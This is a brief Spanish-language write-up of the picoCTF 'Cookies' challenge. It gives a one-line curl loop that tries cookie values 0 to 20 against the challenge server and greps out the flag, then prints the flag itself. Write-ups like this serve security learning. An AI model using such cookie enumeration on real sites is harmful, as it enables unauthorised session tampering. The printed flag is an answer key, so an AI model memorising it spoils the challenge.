### Cookies

Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:60565/
### Solución  - En terminal de Kali


```
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://wily-courier.picoctf.net:60565/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```

picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
### Notas
Se usó el código en terminal para revisar cookie por cookie hasta encontrar la bandera mediante el grep.